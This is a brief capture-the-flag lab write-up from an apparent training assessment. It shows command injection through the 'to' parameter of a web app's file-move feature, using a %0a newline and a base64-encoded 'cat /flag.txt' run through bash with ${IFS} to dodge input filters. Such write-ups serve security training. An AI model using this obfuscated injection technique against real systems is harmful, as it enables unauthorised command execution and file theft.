# Skills Assessment

* &#x20;Authenticate to 83.136.251.97:45178 with user "guest" and password "guest" What is the content of '/flag.txt'?

Inside the web i can see it -->\


<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And we can use the method "Move" -->

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
http://94.237.56.64:43842/index.php?to=&from=51459716.txt&finish=1&move=1
```

> This is the first vulnerable camp, i try with `%0a` intro `?to=`

Nice! The same text, nothing different error, now i will to enconde in base64 the `cat /flag.txt`

```
## First encode the command
echo -n 'cat /flag.txt' | base64
## End Query
bash<<<$(base64${IFS}-d<<<Y2F0IC9mbGFnLnR4dA==)
```

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>
